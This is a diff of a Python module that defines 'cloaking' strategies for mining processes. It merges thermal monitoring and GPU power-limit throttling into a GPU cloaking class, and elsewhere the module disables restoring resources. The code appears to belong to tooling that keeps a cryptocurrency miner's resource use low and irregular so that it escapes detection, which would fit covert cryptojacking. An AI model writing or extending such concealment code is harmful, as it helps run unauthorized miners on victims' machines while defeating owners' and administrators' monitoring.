@@ -38,7 +38,7 @@ else:
 class StrategyType:
     """
     ✅ ENHANCED: Các loại chiến lược cloaking cho comprehensive resource control.
-    7 unified strategies: CPU, GPU, Network, Disk I/O, Cache, Memory, Thermal Control
+    6 active strategies: CPU, GPU (with thermal), Network, Disk I/O, Cache, Memory
     """
     CPU = "cpu"
     GPU = "gpu"
@@ -46,7 +46,7 @@ class StrategyType:
     DISK_IO = "disk_io"
     CACHE = "cache"
     MEMORY = "memory"
-    THERMAL_CONTROL = "thermal_control"  # ✅ NEW: Advanced thermal management
+    THERMAL_CONTROL = "thermal_control"  # ⚠️ DEPRECATED: Unified vào GPU strategy
 
 ###############################################################################
 #                           CƠ SỞ CỦA CÁC STRATEGY                            #
@@ -1180,23 +1180,24 @@ class CpuCloakStrategy(CloakStrategy):
 
 class GpuCloakStrategy(CloakStrategy):
     """
-    ✅ ENHANCED: Chiến lược cloaking GPU cho comprehensive multi-strategy environment:
+    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
       - Giới hạn power limit,
       - Set xung nhịp,
-      - (Tuỳ chọn) limit_temperature => hạ xung nhịp nếu GPU nóng.
+      - Integrated thermal monitoring và protection
+      - Advanced thermal throttling với emergency protection
     
-    Enhanced cho comprehensive cloaking với thermal coordination.
+    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
     """
     
     strategy_type = StrategyType.GPU
     
-    # ✅ NEW: Comprehensive cloaking attributes
+    # ✅ UNIFIED: Comprehensive cloaking attributes
     is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
     coordination_priority = 100  # Highest priority for GPU processes
-    resource_conflicts = ['thermal_control']  # Conflicts with separate thermal management
-    depends_on_strategies = []  # No dependencies, but coordinates with thermal
+    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
+    depends_on_strategies = []  # No dependencies
     supports_concurrent_application = True  # Safe to apply with other strategies
-    estimated_application_time_ms = 300  # GPU control via NVML ~300ms
+    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
     requires_plugin_system = True  # GPU strategies require plugin system
 
     def __init__(
@@ -1206,7 +1207,7 @@ class GpuCloakStrategy(CloakStrategy):
         gpu_resource_manager: GPUResourceManager
     ):
         """
-        Khởi tạo GpuCloakStrategy.
+        ✅ UNIFIED: Khởi tạo comprehensive GPU cloaking với integrated thermal management.
 
         :param config: Cấu hình cloaking GPU (dict).
         :param logger: Logger.
@@ -1223,12 +1224,23 @@ class GpuCloakStrategy(CloakStrategy):
         if not self.allowed_process_name:
             self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")
 
+        # ✅ UNIFIED: GPU Performance Control
         self.throttle_percentage = config.get('throttle_percentage', 20)
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
             self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
             self.throttle_percentage = 20
 
         self.target_sm_clock = config.get('sm_clock', 1240)
+        
+        # ✅ UNIFIED: Integrated Thermal Management Configuration
+        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
+        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
+        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
+        self.aggressive_cooling = config.get('aggressive_cooling', False)
+        
+        # ✅ UNIFIED: Thermal monitoring enables
+        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
+        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
         self.target_mem_clock = config.get('mem_clock', 877)
 
         self.temperature_threshold = config.get('temperature_threshold', 80)
@@ -1276,12 +1288,16 @@ class GpuCloakStrategy(CloakStrategy):
         
     def apply(self, process: MiningProcess) -> None:
         """
-        Áp dụng GPU cloaking (đồng bộ).
+        ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management.
+        
+        Combines GPU performance control và thermal protection trong single strategy.
         
         :param process: Đối tượng MiningProcess.
         """
         try:
             pid, name = process.pid, process.name
+
+            self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")
 
             # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
             if self.allowed_process_name and name != self.allowed_process_name:
@@ -1325,10 +1341,11 @@ class GpuCloakStrategy(CloakStrategy):
                 else:
                     self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")
 
-            # Gọi hàm nội bộ để thực hiện giám sát nhiệt độ + sleep ngẫu nhiên 
-            temp_thread = threading.Thread(target=self._limit_temperature_and_random_sleep, args=(pid, gpu_count))
-            temp_thread.start()
-            self.logger.info(f"[GPU Cloaking] Áp dụng cloaking GPU cho {name}(PID={pid}).")
+            # ✅ UNIFIED: Integrated thermal management (không cần separate thread)
+            if self.enable_thermal_monitoring:
+                self._apply_integrated_thermal_management(pid, gpu_count)
+            
+            self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
@@ -1339,6 +1356,73 @@ class GpuCloakStrategy(CloakStrategy):
                 f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
             
+    def _apply_integrated_thermal_management(self, pid: int, gpu_count: int) -> None:
+        """
+        ✅ UNIFIED: Integrated thermal management trong GPU cloaking strategy.
+        
+        Eliminates need for separate ThermalControlStrategy.
+        """
+        try:
+            self.logger.info(f"🌡️ [Integrated Thermal] Applying thermal management for PID={pid}")
+            
+            for gpu_index in range(gpu_count):
+                try:
+                    # Get current temperature
+                    current_temp = self.gpu_resource_manager.get_gpu_temperature(gpu_index)
+                    if current_temp is None:
+                        continue
+                        
+                    self.logger.debug(f"🌡️ [Thermal] GPU {gpu_index}: {current_temp}°C (threshold: {self.gpu_temp_threshold}°C)")
+                    
+                    # Apply thermal responses
+                    if current_temp >= self.emergency_shutdown_temp:
+                        self._apply_emergency_thermal_protection(gpu_index, pid)
+                    elif current_temp >= self.gpu_temp_threshold:
+                        self._apply_progressive_thermal_throttling(gpu_index, current_temp, pid)
+                    else:
+                        self.logger.debug(f"✅ [Thermal] GPU {gpu_index} temperature normal")
+                        
+                except Exception as gpu_error:
+                    self.logger.error(f"❌ [Thermal] Error processing GPU {gpu_index}: {gpu_error}")
+                    
+        except Exception as e:
+            self.logger.error(f"❌ [Integrated Thermal] Thermal management error: {e}")
+
+    def _apply_progressive_thermal_throttling(self, gpu_index: int, current_temp: float, pid: int) -> None:
+        """Progressive thermal throttling based on temperature overshoot"""
+        try:
+            temp_overshoot = current_temp - self.gpu_temp_threshold
+            throttle_intensity = min(50, int(temp_overshoot * 2))
+            
+            current_power = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
+            if current_power:
+                reduced_power = int(current_power * (100 - throttle_intensity) / 100)
+                success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, reduced_power)
+                
+                if success:
+                    self.logger.warning(f"🌡️ [Thermal Throttle] GPU {gpu_index}: {current_power}W → {reduced_power}W")
+                else:
+                    self.logger.error(f"❌ [Thermal] Failed throttling GPU {gpu_index}")
+                    
+        except Exception as e:
+            self.logger.error(f"❌ [Thermal Throttle] Error: {e}")
+
+    def _apply_emergency_thermal_protection(self, gpu_index: int, pid: int) -> None:
+        """Emergency thermal protection measures"""
+        try:
+            self.logger.error(f"🚨 [EMERGENCY THERMAL] GPU {gpu_index} emergency protection")
+            
+            min_power_limit = 100  # Minimum safe power
+            success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, min_power_limit)
+            
+            if success:
+                self.logger.error(f"🚨 [EMERGENCY] GPU {gpu_index} power → {min_power_limit}W")
+            else:
+                self.logger.error(f"💀 [EMERGENCY] Failed emergency protection GPU {gpu_index}")
+                
+        except Exception as e:
+            self.logger.error(f"💀 [EMERGENCY] Error: {e}")
+
     def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
@@ -1644,150 +1728,15 @@ class MemoryCloakStrategy(CloakStrategy):
         """
         self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
-###############################################################################
-#           THERMAL CONTROL STRATEGY: ThermalControlStrategy                  #
-###############################################################################
-
-class ThermalControlStrategy(CloakStrategy):
-    """
-    ✅ NEW: Advanced thermal control strategy cho comprehensive GPU cloaking.
-    Provides independent thermal management separate from GPU cloaking.
-    """
-    
-    strategy_type = StrategyType.THERMAL_CONTROL
-    requires_plugin_system = False  # Direct NVML access
-    
-    # ✅ NEW: Comprehensive cloaking attributes
-    is_primary_strategy = False  # Thermal is SECONDARY/SPECIALIZED strategy
-    coordination_priority = 60  # Medium priority
-    resource_conflicts = ['gpu_cloaking']  # May conflict with GPU strategy thermal settings
-    depends_on_strategies = ['gpu_cloaking']  # Should apply after GPU cloaking
-    supports_concurrent_application = False  # May conflict with GPU thermal settings
-    estimated_application_time_ms = 150  # Thermal monitoring setup ~150ms
-
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger,
-        gpu_resource_manager: GPUResourceManager
-    ):
-        """
-        ✅ NEW: Khởi tạo ThermalControlStrategy cho advanced GPU thermal management.
-        """
-        self.logger = logger
-        self.config = config
-        self.gpu_resource_manager = cast(Any, gpu_resource_manager)
-
-        # Thermal thresholds
-        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
-        self.cpu_temp_threshold = config.get('cpu_temp_threshold', 80)  # °C
-        self.aggressive_cooling = config.get('aggressive_cooling', False)
-        
-        # Thermal response actions
-        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
-        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
-
-    def apply(self, process: MiningProcess) -> None:
-        """
-        ✅ NEW: Áp dụng advanced thermal control cho mining process.
-        
-        :param process: Đối tượng MiningProcess.
-        """
-        try:
-            pid, name = process.pid, process.name
-            
-            # Check if GPU resource manager is available
-            if not hasattr(self.gpu_resource_manager, 'get_gpu_count'):
-                self.logger.warning(f"[Thermal Control] GPU resource manager not available for PID={pid}")
-                return
-                
-            gpu_count = self.gpu_resource_manager.get_gpu_count()
-            if gpu_count == 0:
-                self.logger.debug(f"[Thermal Control] No GPUs detected for PID={pid}")
-                return
-
-            self.logger.info(f"🌡️ [Thermal Control] Applying thermal monitoring for {name} (PID={pid})")
-            
-            # Apply thermal monitoring for each GPU
-            for gpu_index in range(gpu_count):
-                try:
-                    current_temp = self.gpu_resource_manager.get_gpu_temperature(gpu_index)
-                    if current_temp is None:
-                        continue
-                        
-                    self.logger.info(f"🌡️ [Thermal] GPU {gpu_index} temperature: {current_temp}°C (threshold: {self.gpu_temp_threshold}°C)")
-                    
-                    # Apply thermal responses based on temperature
-                    if current_temp >= self.emergency_shutdown_temp:
-                        self.logger.error(f"🚨 [Thermal EMERGENCY] GPU {gpu_index} temperature {current_temp}°C >= {self.emergency_shutdown_temp}°C")
-                        # Emergency thermal protection
-                        self._apply_emergency_thermal_protection(gpu_index, pid)
-                        
-                    elif current_temp >= self.gpu_temp_threshold:
-                        self.logger.warning(f"⚠️ [Thermal] GPU {gpu_index} temperature {current_temp}°C >= {self.gpu_temp_threshold}°C")
-                        # Progressive thermal throttling
-                        self._apply_thermal_throttling(gpu_index, current_temp, pid)
-                        
-                    else:
-                        self.logger.debug(f"✅ [Thermal] GPU {gpu_index} temperature normal: {current_temp}°C")
-                        
-                except Exception as gpu_error:
-                    self.logger.error(f"❌ [Thermal] Error processing GPU {gpu_index}: {gpu_error}")
-
-            self.logger.info(f"✅ [Thermal Control] Applied thermal monitoring for {name} (PID={pid})")
-            
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Thermal Control: Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Thermal Control: Không đủ quyền cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi Thermal Control cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-
-    def _apply_thermal_throttling(self, gpu_index: int, current_temp: float, pid: int) -> None:
-        """Apply progressive thermal throttling based on temperature"""
-        try:
-            # Calculate throttling intensity based on temperature overshoot
-            temp_overshoot = current_temp - self.gpu_temp_threshold
-            throttle_intensity = min(50, int(temp_overshoot * 2))  # Max 50% throttling
-            
-            # Apply power limit reduction
-            current_power = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
-            if current_power:
-                reduced_power = int(current_power * (100 - throttle_intensity) / 100)
-                success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, reduced_power)
-                
-                if success:
-                    self.logger.info(f"🌡️ [Thermal Throttle] GPU {gpu_index}: {current_power}W → {reduced_power}W ({throttle_intensity}% reduction)")
-                else:
-                    self.logger.error(f"❌ [Thermal Throttle] Failed to reduce power for GPU {gpu_index}")
-                    
-        except Exception as e:
-            self.logger.error(f"❌ [Thermal Throttle] Error throttling GPU {gpu_index}: {e}")
-
-    def _apply_emergency_thermal_protection(self, gpu_index: int, pid: int) -> None:
-        """Apply emergency thermal protection measures"""
-        try:
-            self.logger.error(f"🚨 [EMERGENCY THERMAL] Applying emergency protection for GPU {gpu_index}")
-            
-            # Reduce power to minimum safe level
-            min_power_limit = 100  # Minimum safe power limit
-            success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, min_power_limit)
-            
-            if success:
-                self.logger.error(f"🚨 [EMERGENCY] GPU {gpu_index} power reduced to {min_power_limit}W")
-            else:
-                self.logger.error(f"💀 [EMERGENCY] Failed to apply emergency power reduction for GPU {gpu_index}")
-                
-        except Exception as e:
-            self.logger.error(f"💀 [EMERGENCY] Error applying emergency protection for GPU {gpu_index}: {e}")
-
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục Thermal Control - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[THERMAL RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+# ✅ REMOVED: ThermalControlStrategy class đã được unified vào GpuCloakStrategy
+# 
+# Thermal management được integrated trực tiếp trong GpuCloakStrategy để:
+# - Eliminate resource conflicts between GPU and thermal strategies
+# - Improve coordination and reduce overhead  
+# - Single unified GPU control với comprehensive thermal protection
+# - Simplified strategy assignment logic
+#
+# Use GpuCloakStrategy với enable_thermal_monitoring=True thay vì separate thermal strategy.
 
 ###############################################################################
 #                    DEPRECATED: CloakStrategyFactory REMOVED                 #
